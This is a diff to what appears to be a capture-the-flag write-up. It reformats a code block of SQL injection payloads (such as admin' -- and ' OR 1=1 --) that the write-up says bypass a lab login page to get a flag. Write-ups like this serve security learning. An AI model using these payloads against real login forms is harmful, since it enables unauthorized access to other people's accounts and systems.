@@ -2,16 +2,17 @@
 
 The first login page is vulnerable to SQL injection. The following payloads can be used to bypass the login:
 
-\`\`\`
-admin' --
-admin' #
-admin'/_
-' OR 1=1 --
-' OR 1=1 #
-' OR 1=1/_
-') OR '1'='1--
-') OR ('1'='1--
-\`\`\`
+
+ ```sql
+ admin' --
+ admin' #
+ admin'/*
+ ' OR 1=1 --
+ ' OR 1=1 #
+ ' OR 1=1/*
+ ') OR '1'='1--
+ ') OR ('1'='1--
+ ```
 
 Use this payload in either the username or password field to bypass the login, obtaining the first flag.
 
